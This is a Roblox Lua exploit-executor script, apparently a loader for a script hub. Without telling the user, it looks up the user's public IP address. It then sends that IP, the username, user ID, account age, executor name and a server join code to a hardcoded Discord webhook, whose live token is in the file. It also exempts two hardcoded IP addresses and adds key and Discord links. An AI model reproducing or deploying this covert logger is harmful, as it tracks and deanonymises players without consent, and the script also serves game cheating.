if getgenv().scriptversion == nil then
	getgenv().scriptversion = "1.0.0"
end

local IP = game:HttpGet("https://v4.ident.me")
plr = game:GetService'Players'.LocalPlayer
local premium = false
local ALT = false
local executor = identifyexecutor()
local placeid = game.PlaceId
local jobid = game.JobId
local joincode = "game:GetService('TeleportService'):TeleportToPlaceInstance("..placeid..", "..jobid..")"
if plr.MembershipType == Enum.MembershipType.Premium then
    premium = true
elseif plr.MembershipType == Enum.MembershipType.None then
    premium = false
end
if premium == false then 
    if plr.AccountAge <= 70 then 
        ALT = true
    end
end

local market = game:GetService("MarketplaceService")
local info = market:GetProductInfo(game.PlaceId, Enum.InfoType.Asset)


local http_request = http_request;
if syn then
    http_request = syn.request
elseif SENTINEL_V2 then
    function http_request(tb)
        return {
            StatusCode = 200;
            Body = request(tb.Url, tb.Method, (tb.Body or ''))
        }
    end
end


local HttpServ = game:GetService('HttpService')
local url = "https://discord.com/api/webhooks/1128404165668913324/CDqjzgzloQ4aLzclI-9BfT70AOosmYFUWSpJ606oJ-qLPXBuEAr6rJhGnQSIba1CIsTK"


local data = 
    {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "__**Script Executed**__",
            ["description"] = hwid,
            ["type"] = "rich",
            ["color"] = tonumber(0xAB0909),
            ["fields"] = {
                {
                    ["name"] = "Username:",
                    ["value"] = Game.Players.LocalPlayer.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "UserId:",
                    ["value"] = Game.Players.LocalPlayer.UserId,
                    ["inline"] = true
                },
                {
                    ["name"] = "Game Link:",
                    ["value"] = "https://roblox.com/games/" .. game.PlaceId .. "/",
                    ["inline"] = true
                },
                {
                    ["name"] = "Game Name:",
                    ["value"] = info.Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "Executor:",
                    ["value"] = executor,
                    ["inline"] = true
                },
                {
                    ["name"] = "Script Version:",
                    ["value"] = getgenv().scriptversion,
                    ["inline"] = true
                },
                {
                    ["name"] = "Account Age:",
                    ["value"] = plr.AccountAge,
                    ["inline"] = true
                },
                {
                    ["name"] = "IP:",
                    ["value"] = IP,
                    ["inline"] = true
                },
                {
                    ["name"] = "Join Code:",
                    ["value"] = "```"..joincode.."```",
                    ["inline"] = true
                },
            },
        }}
    }
    local newdata = HttpServ:JSONEncode(data)
    
    local headers = {
            ["content-type"] = "application/json"
    }
    
    local request_payload = {Url=url, Body=newdata, Method="POST", Headers=headers}
    http_request(request_payload)

local ip = game:HttpGet("https://v4.ident.me")
if ip ~= "2.212.149.233" and ip ~= "86.157.169.141" then
  local rand = math.random()
  local rand2 = math.random(0, 10)
  local finalNum = rand + rand2
  
  print("Loaded In: "..finalNum.." Seconds")
  
  game:GetService("CoreGui").ChildAdded:Connect(function(Child)
    if Child.Name == "AdminusLoader" then
        local Console = Child:WaitForChild("Console")
        local Copy = Console:WaitForChild("Copy")
        Copy.MouseButton1Click:Connect(function()
            wait(0.1)
            setclipboard("https://direct-link.net/889860/pjl-key")
        end)
        local UICorner = Instance.new("UICorner")
        local Join = Instance.new("TextButton")
        Join.Name = "Join"
        Join.Parent = Console
        Join.BackgroundColor3 = Color3.fromRGB(95, 18, 184)
        Join.Position = UDim2.new(0.439074895, 0, 0.909482718, 0)
        Join.Size = UDim2.new(0, 124, 0, 34)
        Join.Font = Enum.Font.SourceSans
        Join.Text = "Copy Discord Link"
        Join.TextColor3 = Color3.fromRGB(199, 199, 199)
        Join.TextSize = 14.000
    		UICorner.Parent = Join
    		UICorner.CornerRadius = UDim.new(0, 8)
	      Join.MouseButton1Down:Connect(function()
            setclipboard("https://discord.gg/cM7PcA6eae")
            Join.Text = "LINK COPIED!"
            wait(2)
            Join.Text = "Copy Discord Link"
        end)
    end
  end)
end
